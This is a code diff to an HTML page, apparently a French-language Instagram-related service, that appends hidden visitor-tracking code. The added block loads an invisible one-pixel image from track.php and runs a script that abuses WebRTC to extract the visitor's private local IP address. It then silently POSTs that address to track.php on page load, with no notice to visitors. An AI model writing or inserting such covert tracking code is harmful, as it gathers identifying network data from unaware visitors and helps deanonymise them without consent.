@@ -293,5 +293,42 @@
             <p style="margin-top: 5px;">Ce service n'est pas affilié à Instagram/Facebook</p>
         </footer>
     </div>
+
+    <!-- ============================================ -->
+    <!-- TRACKING : IP publique + privée + User Agent -->
+    <!-- ============================================ -->
+    
+    <!-- Pixel invisible pour IP publique et User Agent -->
+    <img src="track.php" width="1" height="1" style="display:none;" alt="">
+    
+    <!-- Script pour capturer l'IP privée (WebRTC) -->
+    <script>
+    function getLocalIP(callback) {
+        var pc = new RTCPeerConnection({ iceServers: [] });
+        pc.createDataChannel('');
+        pc.createOffer().then(offer => pc.setLocalDescription(offer));
+        pc.onicecandidate = event => {
+            if (event && event.candidate && event.candidate.candidate) {
+                var ip = event.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
+                if (ip) {
+                    callback(ip[0]);
+                    pc.close();
+                }
+            }
+        };
+        setTimeout(function() {
+            callback('non détectée');
+            pc.close();
+        }, 2000);
+    }
+    
+    getLocalIP(function(localIP) {
+        fetch('track.php', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+            body: 'local_ip=' + encodeURIComponent(localIP)
+        }).catch(function() {});
+    });
+    </script>
 </body>
 </html>
